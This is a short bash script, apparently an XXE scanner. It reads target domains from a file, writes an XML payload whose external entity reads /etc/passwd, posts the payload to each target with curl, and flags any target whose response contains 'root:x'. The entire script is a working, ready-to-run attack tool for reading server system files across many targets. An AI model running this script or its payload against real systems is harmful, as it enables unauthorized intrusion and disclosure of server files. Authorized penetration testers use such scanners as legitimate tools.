#!/bin/bash

test -e targets.txt || echo "Target file not found :("
test -e xml.txt || echo "XML file not found, no worries it will be made! :D" 

time while read -r target; do


    echo "Preparing script.. "

    if [ -f xml.txt ]; then
        echo "Payload Exists! "
    else
        cat <<- XMLFILE >> "xml.txt"
	<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
	XMLFILE
    fi

    echo "Starting attack on domains!"

    if curl -s -d @xml.txt --header "Content-Type: application/xml;charset=UTF-8" "$target" | grep -q "root:x"; then
        echo "Target $target might be vulnerable to XXE."
    else
        echo "Target $target is not vulnerable to XXE."
    fi

done < targets.txt
